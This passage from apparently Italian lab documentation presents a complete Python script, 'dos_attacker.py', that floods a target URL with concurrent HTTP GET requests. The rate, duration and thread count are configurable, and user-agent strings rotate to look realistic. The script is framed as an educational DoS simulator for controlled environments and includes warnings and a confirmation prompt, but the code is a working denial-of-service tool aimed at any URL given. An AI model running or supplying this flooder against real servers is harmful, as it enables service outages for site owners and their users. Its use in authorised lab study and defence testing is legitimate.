
### 2. Script Attaccante Migliorato (`scripts/attacker/dos_attacker.py`)
```python
#!/usr/bin/env python3
"""
Simulatore Didattico di Attacco DoS HTTP Flood
Utilizzare solo in ambienti controllati per scopi educativi
"""

import argparse
import requests
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor
import logging

class DoSSimulator:
    def __init__(self, target_url, max_workers=50):
        self.target_url = target_url
        self.max_workers = max_workers
        self.is_attacking = False
        self.requests_sent = 0
        self.setup_logging()
    
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('dos_attack.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def send_request(self, request_id):
        """Invia una singola richiesta HTTP"""
        try:
            headers = self.generate_headers()
            response = requests.get(
                self.target_url,
                headers=headers,
                timeout=5
            )
            self.requests_sent += 1
            self.logger.debug(f"Request {request_id}: Status {response.status_code}")
        except Exception as e:
            self.logger.error(f"Request {request_id} failed: {str(e)}")
    
    def generate_headers(self):
        """Genera headers HTTP realistici"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
    
    def attack(self, duration=60, requests_per_second=10):
        """Esegue l'attacco per la durata specificata"""
        self.logger.info(f"Iniziando attacco a {self.target_url}")
        self.logger.info(f"Durata: {duration}s, RPS: {requests_per_second}")
        
        self.is_attacking = True
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            while self.is_attacking and (time.time() - start_time) < duration:
                for i in range(requests_per_second):
                    executor.submit(self.send_request, self.requests_sent + i)
                
                time.sleep(1)  # Controlla RPS
                
                # Log ogni 10 secondi
                if int(time.time() - start_time) % 10 == 0:
                    self.logger.info(f"Requests inviati: {self.requests_sent}")
        
        self.is_attacking = False
        self.logger.info(f"Attacco completato. Totale requests: {self.requests_sent}")

def main():
    parser = argparse.ArgumentParser(description='Simulatore DoS Didattico')
    parser.add_argument('target', help='URL target (es: http://192.168.56.101)')
    parser.add_argument('-d', '--duration', type=int, default=60, 
                       help='Durata attacco in secondi (default: 60)')
    parser.add_argument('-rps', '--requests-per-second', type=int, default=10,
                       help='Requests per secondo (default: 10)')
    parser.add_argument('-w', '--workers', type=int, default=50,
                       help='Numero massimo di worker threads (default: 50)')
    
    args = parser.parse_args()
    
    # Avvertenza di sicurezza
    print("⚠️  AVVISO: Questo tool è solo per scopi didattici!")
    print("⚠️  Usare solo in ambienti controllati con autorizzazione")
    print(f"Target: {args.target}")
    print(f"Durata: {args.duration}s")
    print(f"RPS: {args.requests_per_second}")
    
    confirm = input("Procedere? (yes/no): ")
    if confirm.lower() != 'yes':
        print("Operazione annullata.")
        return
    
    attacker = DoSSimulator(args.target, args.workers)
    attacker.attack(args.duration, args.requests_per_second)

if __name__ == "__main__":
    main()
